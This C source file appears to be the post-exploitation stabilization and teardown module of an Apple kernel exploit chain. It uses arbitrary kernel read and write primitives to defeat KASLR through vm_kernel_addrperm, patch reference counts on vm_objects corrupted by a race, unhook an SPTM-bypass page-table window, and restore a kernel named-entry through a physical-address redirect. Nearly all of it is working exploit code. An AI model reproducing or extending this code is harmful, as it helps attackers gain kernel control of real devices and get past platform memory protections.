#include <mach/mach.h>
#include <mach/vm_map.h>
#include <stdint.h>
#include "kernel_primitives.h"
#include "kread_bootstrap.h"
#include "sptm_bypass.h"
#include "stabilize.h"

extern vm_size_t vm_page_size;

#define VMO_LOCK_STATE             0x10
#define VMO_LOCK_OWNER             0x14
#define VMO_REFCOUNT               0x28
#define VMO_CANSLEEP_BIT           22
#define VM_KERNEL_ADDRPERM_UNSLID  0xfffffff0278feb20ULL
#define STAB_REFC_MARGIN           0x40

#pragma mark - repair: pin the raced vm_object refcount (keep primitives live)

int stabilize_repair_keep_primitives(void) {
    kwlog("[stab] === repair (keep primitives) ===\n");

    int n = kread_bootstrap_get_raced_count();
    kwlog("[stab] raced vm_objects to repair: %d\n", n);
    if (n <= 0) { kwlog("[stab] none recorded\n"); return 0; }

    uint64_t slide = kwrite_get_kaslr_slide();
    uint64_t addrperm = 0;
    if (slide) kread_via_thread_state_impl(VM_KERNEL_ADDRPERM_UNSLID + slide, &addrperm, 8);
    kwlog("[stab] kaslr_slide=0x%llx vm_kernel_addrperm=0x%llx\n",
          (unsigned long long)slide, (unsigned long long)addrperm);
    if (!addrperm || !(addrperm & 1)) {
        kwlog("[stab] addrperm=0x%llx (expect nonzero & odd), ABORT\n", (unsigned long long)addrperm);
        return -1;
    }

    int repaired = 0;
    for (int i = 0; i < n; i++) {
        uint64_t obj_id = kread_bootstrap_get_raced_obj_id(i);
        uint64_t base   = kread_bootstrap_get_raced_base(i);
        uint32_t delta  = kread_bootstrap_get_raced_delta(i);
        uint64_t obj_kva = (obj_id - addrperm) & ~1ULL;
        kwlog("[stab] [%d] obj_id=0x%llx base=0x%llx delta=%u -> obj_kva=0x%llx\n",
              i, (unsigned long long)obj_id, (unsigned long long)base, delta, (unsigned long long)obj_kva);

        if (obj_kva < 0xFFFFFE0000000000ULL) {
            kwlog("[stab] [%d] obj_kva=0x%llx not a kernel pointer -> SKIP\n", i, (unsigned long long)obj_kva);
            continue;
        }

        uint32_t state = 0, owner = 0, refc = 0;
        kern_return_t kr1 = kread_via_thread_state_impl(obj_kva + VMO_LOCK_STATE, &state, 4);
        kern_return_t kr2 = kread_via_thread_state_impl(obj_kva + VMO_LOCK_OWNER, &owner, 4);
        kern_return_t kr3 = kread_via_thread_state_impl(obj_kva + VMO_REFCOUNT,   &refc,  4);
        int can_sleep = (state >> VMO_CANSLEEP_BIT) & 1;
        kwlog("[stab] [%d] READ state=0x%08x (can_sleep=%d) owner=0x%08x ref_count=%d (kr %d/%d/%d)\n",
              i, state, can_sleep, owner, (int)refc, kr1, kr2, kr3);
        if (kr1 || kr2 || kr3) { kwlog("[stab] [%d] read failed -> SKIP\n", i); continue; }

        if (refc < 1 || refc > 0x10000) {
            kwlog("[stab] [%d] ref_count %d implausible -> SKIP\n", i, (int)refc);
            continue;
        }
        if (!can_sleep) {
            kwlog("[stab] [%d] can_sleep clear at Phase-1 -> SKIP write\n", i);
            continue;
        }

        uint32_t newrefc = refc + delta + STAB_REFC_MARGIN;
        int wr = kwrite_via_necp_object(obj_kva + VMO_REFCOUNT, &newrefc, 4, 1);
        uint32_t back = 0; kread_via_thread_state_impl(obj_kva + VMO_REFCOUNT, &back, 4);
        kwlog("[stab] [%d] ref_count %d -> %u (necp wr=%d, readback=%u) %s\n",
              i, (int)refc, newrefc, wr, back,
              (back == newrefc) ? "OK" : "MISMATCH");
        if (back == newrefc) repaired++;
    }

    kwlog("[stab] repaired %d/%d raced objects\n", repaired, n);

    return 0;
}

#pragma mark - teardown: unhook the broad-bypass L1 window

static int stabilize_unhook_window(void) {
    uint64_t l1_pa = 0, free_off = 0, l1tab = 0, hookval = 0;
    if (!sptm_window_unhook_info(&l1_pa, &free_off, &l1tab, &hookval)) {
        kwlog("[stab] unhook: bypass window not installed\n"); return 0;
    }
    if (!l1_pa || !l1tab) { kwlog("[stab] unhook: missing captured l1_pa/l1tab -- ABORT\n"); return -1; }
    uint64_t cur = 0;
    if (kwrite_kread64(l1tab + free_off, &cur) != KERN_SUCCESS) { kwlog("[stab] unhook: read real L1 entry FAILED -- ABORT\n"); return -1; }
    kwlog("[stab] unhook: real L1[+0x%llx]=0x%llx (our hook=0x%llx) l1_pa=0x%llx l1tab=0x%llx\n",
          (unsigned long long)free_off,(unsigned long long)cur,(unsigned long long)hookval,
          (unsigned long long)l1_pa,(unsigned long long)l1tab);
    if (cur != hookval) { kwlog("[stab] unhook: L1 entry != our captured hook -- ABORT\n"); return -1; }
    int wr = sptm_kwrite32_pa(l1_pa + free_off, 0);
    uint64_t after = 0; kwrite_kread64(l1tab + free_off, &after);
    int ok = ((after & 1ULL) == 0);
    kwlog("[stab] unhook: cleared valid bit of L1[+0x%llx] (sptm_kwrite32_pa rc=%d) -> entry now 0x%llx %s\n",
          (unsigned long long)free_off,wr,(unsigned long long)after,
          ok ? "bit0=0" : "bit0=1");
    if (ok) { sptm_window_mark_uninstalled(); return 0; }
    return -1;
}

#pragma mark - teardown: restore the label372 named-entry (via groom)

static void label372_restore_via_groom(void) {
    label372_orig_t o;
    if (!stab_get_label372_orig(&o)) { kwlog("[stab] label372 restore: no captured originals -- skip\n"); return; }
    uint8_t  *groom     = kwrite_get_groom_elem();
    uint32_t  mem_entry = kwrite_get_mem_entry_port();
    uint64_t  page_mask = kwrite_get_page_mask();
    if (!groom || !mem_entry || !page_mask) {
        kwlog("[stab] label372 restore: groom/mem_entry/mask unavailable -- skip\n"); return;
    }
    uint64_t page_size = (uint64_t)vm_page_size;

    uint64_t old_pa = 0;
    kern_return_t kr = pa_redirect_write(groom, o.v177_pa & ~page_mask, &old_pa);
    if (kr) { kwlog("[stab] label372 restore: redirect groom->v177 FAIL 0x%x -- skip\n", kr); return; }
    vm_address_t mapped = 0;
    kr = map_phys_page(mem_entry, &mapped);
    if (kr) { kwlog("[stab] label372 restore: map v177 FAIL 0x%x\n", kr); pa_redirect_restore(groom, old_pa); return; }
    {
        uint64_t v179 = (page_mask & o.v177_kva) + mapped;
        *(uint32_t *)(v179 + 116) = o.v177_flags_orig;
        *(uint64_t *)(v179 + 80)  = o.v177_pa_orig;
        *(uint64_t *)(v179 + 24)  = page_size;
        kwlog("[stab] label372 v177 restored: flags=0x%x PA=0x%llx size@24=0x%llx\n",
              o.v177_flags_orig, (unsigned long long)o.v177_pa_orig, (unsigned long long)page_size);
    }
    vm_deallocate(mach_task_self_, mapped, vm_page_size);

    kr = pa_redirect_write(groom, o.v173_pa & ~page_mask, NULL);
    if (kr) { kwlog("[stab] label372 restore: redirect groom->v173 FAIL 0x%x (v177 done)\n", kr); pa_redirect_restore(groom, old_pa); return; }
    mapped = 0;
    kr = map_phys_page(mem_entry, &mapped);
    if (kr) { kwlog("[stab] label372 restore: map v173 FAIL 0x%x (v177 done)\n", kr); pa_redirect_restore(groom, old_pa); return; }
    {
        uint64_t v181 = (page_mask & o.v173_kva) + mapped;
        *(uint64_t *)(v181 + 32) = page_size;
        kwlog("[stab] label372 v173 restored: size@32=0x%llx\n", (unsigned long long)page_size);
    }
    vm_deallocate(mach_task_self_, mapped, vm_page_size);

    pa_redirect_restore(groom, old_pa);
    kwlog("[stab] label372 named-entry restored via groom\n");
}

#pragma mark - teardown: close all primitives (the Teardown button)

int stabilize_close_primitives(void) {
    kwlog("[stab] === teardown (close primitives) ===\n");

    port_persistence_balance();

    int u = stabilize_unhook_window();
    kwlog("[stab] unhook rc=%d\n", u);

    necp_handle_teardown();
    krw_primitives_teardown();
    hijack_teardown();

    label372_restore_via_groom();

    kwlog("[stab] === teardown COMPLETE ===: io_references balanced + dyld slots cleared; bypass window unhooked; "
          "necp/krw/hijack torn down; label372 named-entry restored (groom).\n");

    kread_bootstrap_cleanup();
    return 0;
}
